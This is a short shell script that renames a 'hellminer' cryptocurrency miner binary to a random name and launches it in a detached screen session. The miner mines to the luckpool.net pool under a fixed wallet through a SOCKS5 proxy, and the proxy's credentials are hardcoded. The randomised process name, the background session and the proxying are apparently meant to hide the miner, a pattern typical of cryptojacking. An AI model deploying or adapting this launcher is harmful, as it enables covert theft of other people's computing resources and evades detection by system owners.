proxy_url="socks5://tykQ7b:qxmTUk@95.164.245.175:9864"
random_name=$(tr -dc A-Za-z </dev/urandom | head -c 10)
mv hellminer $random_name
chmod +x $random_name
screen -d -m bash -c "./$random_name -c stratum+tcp://eu.luckpool.net:3956 -u RGR7bDEzCXdfdLpLYv7gmpuPbPx6tP87iQ.yoah2 -p x --cpu 6 --proxy=$proxy_url"
